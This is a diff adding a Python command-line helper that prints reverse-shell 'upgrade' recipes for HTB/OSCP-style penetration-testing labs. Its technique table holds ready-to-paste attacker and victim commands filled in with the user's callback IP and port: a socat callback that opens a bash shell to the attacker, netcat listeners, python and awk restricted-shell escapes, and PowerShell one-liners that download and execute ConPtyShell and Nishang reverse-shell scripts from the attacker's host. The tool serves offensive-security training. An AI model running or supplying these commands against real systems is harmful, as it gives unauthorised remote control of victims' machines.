@@ -1,0 +1,379 @@
+#!/usr/bin/env python3
+import argparse
+import os
+import re
+import shutil
+import subprocess
+import sys
+from dataclasses import dataclass
+from typing import Dict, List, Optional, Tuple
+
+
+@dataclass
+class Step:
+    side: str  # attacker | victim | note
+    cmd: str
+    warn: bool = False
+    explain: str = ""
+
+
+@dataclass
+class Technique:
+    id: str
+    platform: str  # linux | windows | mixed
+    title: str
+    tags: List[str]
+    summary: str
+    steps: List[Step]
+
+
+def load_dotenv(path: str = ".env") -> Dict[str, str]:
+    data: Dict[str, str] = {}
+    if not os.path.isfile(path):
+        return data
+    with open(path, "r", encoding="utf-8", errors="ignore") as f:
+        for raw in f:
+            s = raw.strip()
+            if not s or s.startswith("#"):
+                continue
+            if s.startswith("export "):
+                s = s[len("export "):]
+            if "=" not in s:
+                continue
+            k, v = s.split("=", 1)
+            data[k.strip()] = v.strip().strip('"').strip("'")
+    return data
+
+
+def run_cmd(cmd: List[str]) -> str:
+    try:
+        return subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True).strip()
+    except Exception:
+        return ""
+
+
+def ip_from_iface(iface: str) -> Optional[str]:
+    out = run_cmd(["ip", "-4", "addr", "show", iface])
+    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", out)
+    return m.group(1) if m else None
+
+
+def detect_lhost() -> Optional[str]:
+    tun = ip_from_iface("tun0")
+    if tun:
+        return tun
+    out = run_cmd(["ip", "-4", "-o", "addr", "show", "up"])
+    for line in out.splitlines():
+        parts = line.split()
+        if len(parts) < 4:
+            continue
+        iface = parts[1]
+        ip = parts[3].split("/")[0]
+        if iface == "lo" or ip.startswith("127."):
+            continue
+        return ip
+    return None
+
+
+def terminal_size() -> Tuple[int, int]:
+    try:
+        sz = shutil.get_terminal_size((160, 50))
+        rows, cols = sz.lines, sz.columns
+        return rows, cols
+    except Exception:
+        return 50, 160
+
+
+def color(text: str, code: str, use_color: bool) -> str:
+    if not use_color:
+        return text
+    return f"\033[{code}m{text}\033[0m"
+
+
+def side_label(side: str) -> str:
+    if side == "attacker":
+        return "ATTACKER"
+    if side == "victim":
+        return "VICTIM"
+    return "NOTE"
+
+
+def copy_clipboard(text: str) -> Optional[str]:
+    candidates = [
+        ("xclip", ["xclip", "-selection", "clipboard"]),
+        ("xsel", ["xsel", "--clipboard", "--input"]),
+        ("wl-copy", ["wl-copy"]),
+    ]
+    for name, cmd in candidates:
+        if shutil.which(name):
+            try:
+                p = subprocess.Popen(cmd, stdin=subprocess.PIPE)
+                p.communicate(input=text.encode())
+                if p.returncode == 0:
+                    return name
+            except Exception:
+                pass
+    return None
+
+
+def techniques(lhost: str, lport: int, target: str, rows: int, cols: int) -> List[Technique]:
+    return [
+        Technique(
+            id="linux-pty-python3",
+            platform="linux",
+            title="Python3 PTY Spawn + TTY Fix",
+            tags=["linux", "pty", "python3", "stty", "term"],
+            summary="Standard Linux reverse shell upgrade path using Python3 and local terminal reset.",
+            steps=[
+                Step("victim", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", explain="Spawn a bash PTY from a dumb shell."),
+                Step("attacker", "Ctrl-Z", explain="Suspend shell to background locally."),
+                Step("attacker", "stty raw -echo; fg", warn=True, explain="Raw mode helps interactivity; can look broken until reset."),
+                Step("victim", "reset", explain="Reinitialize terminal output."),
+                Step("victim", "export TERM=xterm-256color", explain="Set TERM for proper ncurses behavior."),
+                Step("victim", f"stty rows {rows} columns {cols}", explain="Match victim TTY size to your local terminal."),
+            ],
+        ),
+        Technique(
+            id="linux-pty-python2",
+            platform="linux",
+            title="Python2 PTY Spawn",
+            tags=["linux", "pty", "python2"],
+            summary="Fallback for older boxes with Python2 only.",
+            steps=[
+                Step("victim", "python -c 'import pty; pty.spawn(\"/bin/bash\")'"),
+                Step("attacker", "Ctrl-Z"),
+                Step("attacker", "stty raw -echo; fg", warn=True),
+                Step("victim", "export TERM=xterm"),
+                Step("victim", f"stty rows {rows} columns {cols}"),
+            ],
+        ),
+        Technique(
+            id="linux-script-tty",
+            platform="linux",
+            title="script-Based TTY Upgrade",
+            tags=["linux", "script", "tty"],
+            summary="Useful when Python is unavailable but util-linux script exists.",
+            steps=[
+                Step("victim", "script /dev/null -c bash", explain="Create pseudo-terminal using script."),
+                Step("victim", "export SHELL=/bin/bash"),
+                Step("victim", "export TERM=xterm-256color"),
+                Step("victim", f"stty rows {rows} columns {cols}"),
+            ],
+        ),
+        Technique(
+            id="linux-bash-interactive",
+            platform="linux",
+            title="Bash Interactive Respawn",
+            tags=["linux", "bash", "sh"],
+            summary="Simple shell respawn for /bin/sh contexts.",
+            steps=[
+                Step("victim", "/bin/bash -i"),
+                Step("victim", "exec /bin/bash -i"),
+                Step("victim", "export TERM=xterm"),
+            ],
+        ),
+        Technique(
+            id="linux-socat-fulltty",
+            platform="linux",
+            title="Socat Full TTY (Attacker Listener + Victim Callback)",
+            tags=["linux", "socat", "full-tty", "listener", "callback"],
+            summary="Best quality shell when socat is present on both sides.",
+            steps=[
+                Step("attacker", f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}", explain="Start full-tty listener."),
+                Step("victim", f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}", explain="Call back with robust PTY handling."),
+            ],
+        ),
+        Technique(
+            id="linux-rlwrap-listener",
+            platform="linux",
+            title="rlwrap Netcat Listener",
+            tags=["linux", "rlwrap", "netcat", "listener"],
+            summary="Improves line editing/history for fragile shells.",
+            steps=[
+                Step("attacker", f"rlwrap -cAr nc -lvnp {lport}"),
+                Step("note", "Use arrow keys/history and cleaner prompt interaction."),
+            ],
+        ),
+        Technique(
+            id="linux-restricted-shell",
+            platform="linux",
+            title="Restricted Shell Handling",
+            tags=["linux", "rbash", "restricted", "escape"],
+            summary="Tactics for constrained shells where commands are limited.",
+            steps=[
+                Step("victim", "echo $0; echo $SHELL", explain="Identify restricted shell type."),
+                Step("victim", "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", explain="Restore common PATH if stripped."),
+                Step("victim", "python3 -c 'import os; os.system(\"/bin/bash\")'", explain="Attempt shell escape through Python."),
+                Step("victim", "awk 'BEGIN {system(\"/bin/bash\")}'", explain="Fallback escape vector if awk available."),
+            ],
+        ),
+        Technique(
+            id="windows-powershell-ux",
+            platform="windows",
+            title="PowerShell Shell Improvement Basics",
+            tags=["windows", "powershell", "interactive"],
+            summary="Quick tips to improve usability in PowerShell shells.",
+            steps=[
+                Step("victim", "$ProgressPreference='SilentlyContinue'", explain="Reduce noisy progress bars during transfers."),
+                Step("victim", "powershell -NoP -NonI", explain="Spawn cleaner PowerShell context."),
+                Step("note", "Prefer UTF-8-safe output handling and explicit command paths on Windows."),
+            ],
+        ),
+        Technique(
+            id="windows-conptyshell",
+            platform="windows",
+            title="ConPtyShell Guidance",
+            tags=["windows", "conpty", "tty", "upgrade"],
+            summary="Use ConPtyShell when modern Windows + PowerShell supports pseudo-console bridging.",
+            steps=[
+                Step("attacker", f"stty raw -echo; (stty size; cat) | nc -lvnp {lport}", warn=True, explain="Prepares listener for interactive pty stream."),
+                Step("victim", f"powershell -ep bypass -c \"IEX(IWR http://{lhost}:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {lhost} {lport}\"", explain="Load and execute ConPtyShell callback."),
+                Step("note", "Host Invoke-ConPtyShell.ps1 locally (e.g., with serve)."),
+            ],
+        ),
+        Technique(
+            id="windows-nishang",
+            platform="windows",
+            title="Nishang-style Reverse PowerShell Guidance",
+            tags=["windows", "nishang", "powershell", "reverse"],
+            summary="Reference workflow for Nishang-like reverse shell usage.",
+            steps=[
+                Step("attacker", f"rlwrap -cAr nc -lvnp {lport}"),
+                Step("victim", f"powershell -ep bypass -c \"IEX(IWR http://{lhost}:8000/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}\""),
+                Step("note", "Host script locally and adapt function names to the script version in use."),
+            ],
+        ),
+        Technique(
+            id="windows-winpty-notes",
+            platform="windows",
+            title="winpty Notes (WSL/Linux Side)",
+            tags=["windows", "winpty", "notes"],
+            summary="winpty is useful mainly when interacting with Windows console apps from Unix-like terminals.",
+            steps=[
+                Step("note", "If available, wrap problematic console binaries with winpty for improved interaction."),
+                Step("note", "Not usually needed for standard netcat reverse shells, more relevant in mixed environments."),
+            ],
+        ),
+    ]
+
+
+def render_technique(t: Technique, explain: bool, quiet: bool, use_color: bool) -> str:
+    lines: List[str] = []
+    if not quiet:
+        lines.append(color(f"[{t.id}] {t.title}", "36", use_color))
+        lines.append(color(f"Platform: {t.platform} | Tags: {', '.join(t.tags)}", "90", use_color))
+        lines.append(t.summary)
+        lines.append("")
+
+    for idx, st in enumerate(t.steps, 1):
+        prefix = f"{idx:02d}. "
+        label = side_label(st.side)
+        if quiet:
+            if st.side in {"attacker", "victim"}:
+                lines.append(st.cmd)
+            continue
+        side_col = "33" if st.side == "attacker" else ("32" if st.side == "victim" else "35")
+        line = f"{prefix}{label:<9} {st.cmd}"
+        if st.warn:
+            line = color("[WARN] ", "31", use_color) + line
+        lines.append(color(line, side_col, use_color))
+        if explain and st.explain:
+            lines.append(f"    - {st.explain}")
+
+    return "\n".join(lines)
+
+
+def main() -> int:
+    env = load_dotenv()
+    auto_lhost = env.get("tun0_ip") or detect_lhost() or ""
+    target = env.get("target", "<target>")
+    box = env.get("box", "-")
+    rows, cols = terminal_size()
+
+    p = argparse.ArgumentParser(description="upgrade-shell: shell stabilization assistant for HTB/CPTS/OSCP workflows")
+    p.add_argument("technique", nargs="?", help="Technique ID")
+    p.add_argument("--list", action="store_true", help="List available techniques")
+    p.add_argument("--search", default="", help="Search techniques by keyword")
+    p.add_argument("--flow", default="", help="Alias of technique ID for step-by-step output")
+    p.add_argument("--platform", choices=["linux", "windows", "mixed", "all"], default="all", help="Filter by platform")
+    p.add_argument("--lhost", default=auto_lhost, help="Callback IP (defaults: .env tun0_ip, tun0, active interface)")
+    p.add_argument("--lport", type=int, default=int(os.getenv("UPGRADE_SHELL_DEFAULT_PORT", "4444")), help="Callback/listener port")
+    p.add_argument("--target", default=target, help="Target host/IP (default from .env target)")
+    p.add_argument("--rows", type=int, default=rows, help="Terminal rows for resize commands")
+    p.add_argument("--cols", type=int, default=cols, help="Terminal columns for resize commands")
+    p.add_argument("--quiet", action="store_true", help="Output commands only")
+    p.add_argument("--copy", type=int, default=0, help="Copy Nth command from output (1-based)")
+    p.add_argument("--explain", action="store_true", help="Beginner-friendly explanations")
+    p.add_argument("--no-color", action="store_true", help="Disable ANSI color")
+    p.add_argument("--menu", action="store_true", help="Interactive menu mode")
+
+    args = p.parse_args()
+    use_color = sys.stdout.isatty() and not args.no_color and not args.quiet
+
+    items = techniques(args.lhost, args.lport, args.target, args.rows, args.cols)
+
+    if args.platform != "all":
+        items = [t for t in items if t.platform == args.platform]
+
+    if args.list:
+        for t in items:
+            print(f"{t.id:<24} {t.platform:<8} {t.title}")
+        return 0
+
+    if args.search:
+        q = args.search.lower()
+        for t in items:
+            blob = " ".join([t.id, t.title, t.summary, " ".join(t.tags)]).lower()
+            if q in blob:
+                print(f"{t.id:<24} {t.platform:<8} {t.title}")
+        return 0
+
+    if args.menu:
+        if not sys.stdin.isatty():
+            print("[!] Interactive mode requires a TTY", file=sys.stderr)
+            return 1
+        print(color("upgrade-shell interactive menu", "36", use_color))
+        for i, t in enumerate(items, 1):
+            print(f"{i:02d}) {t.id:<24} {t.title}")
+        sel = input("Select technique number: ").strip()
+        if not sel.isdigit() or not (1 <= int(sel) <= len(items)):
+            print("[!] Invalid selection", file=sys.stderr)
+            return 1
+        chosen = items[int(sel) - 1]
+    else:
+        wanted = args.flow or args.technique
+        if not wanted:
+            p.print_help()
+            return 1
+        chosen = next((t for t in items if t.id == wanted), None)
+        if not chosen:
+            print(f"[!] Unknown technique: {wanted}", file=sys.stderr)
+            print("[i] Use --list to view available technique IDs", file=sys.stderr)
+            return 1
+
+    header = f"upgrade-shell | technique={chosen.id} | box={box} | target={args.target}"
+    if not args.quiet:
+        print(color(header, "36", use_color))
+        print(color("=" * len(header), "36", use_color))
+        print()
+
+    output = render_technique(chosen, explain=args.explain, quiet=args.quiet, use_color=use_color)
+    print(output)
+
+    if args.copy > 0:
+        cmds = [s.cmd for s in chosen.steps if s.side in {"attacker", "victim"}]
+        if args.copy > len(cmds):
+            print(f"[!] copy index out of range (1-{len(cmds)})", file=sys.stderr)
+            return 1
+        copied = copy_clipboard(cmds[args.copy - 1])
+        if not args.quiet:
+            if copied:
+                print(color(f"\n[+] Copied command #{args.copy} via {copied}", "32", use_color))
+            else:
+                print(color("\n[!] Clipboard tool not found (xclip/xsel/wl-copy)", "33", use_color))
+
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
